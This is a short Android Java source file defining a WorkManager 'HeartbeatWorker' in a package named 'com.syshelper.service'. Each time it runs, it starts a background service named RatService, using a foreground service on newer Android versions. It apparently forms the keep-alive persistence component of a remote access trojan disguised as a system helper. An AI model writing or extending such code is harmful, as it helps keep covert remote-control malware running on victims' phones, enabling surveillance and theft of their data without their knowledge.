package com.syshelper.service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

public class HeartbeatWorker extends Worker {
    public HeartbeatWorker(@NonNull Context ctx, @NonNull WorkerParameters p) { super(ctx, p); }

    @NonNull
    @Override
    public Result doWork() {
        Intent svc = new Intent(getApplicationContext(), RatService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) getApplicationContext().startForegroundService(svc);
        else getApplicationContext().startService(svc);
        return Result.success();
    }
}
